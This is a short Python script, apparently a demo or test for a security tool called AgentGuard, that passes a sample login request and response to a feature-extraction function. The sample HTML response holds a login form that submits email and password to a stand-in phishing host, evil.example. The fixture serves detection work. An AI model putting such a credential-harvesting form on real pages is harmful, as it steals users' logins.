import logging
from extraction import extract_features_for_event

logging.basicConfig(level=logging.INFO)

if __name__ == "__main__":
    req_url = "https://example.com/login?next=%2Fbilling"
    req_method = "POST"
    req_headers = {"User-Agent": "AgentGuard/1.0", "Accept": "text/html"}

    res_headers = {"Content-Type": "text/html; charset=utf-8"}
    res_body = b"""
    <html>
      <body>
        <form action="https://evil.example/phish">
          <input type="text" name="email"/>
          <input type="password" name="password"/>
        </form>
      </body>
    </html>
    """

    feats = extract_features_for_event(
        request_url=req_url,
        request_method=req_method,
        request_headers=req_headers,
        response_headers=res_headers,
        response_body=res_body,
        event_type="login",
    )

    print(feats.to_dict())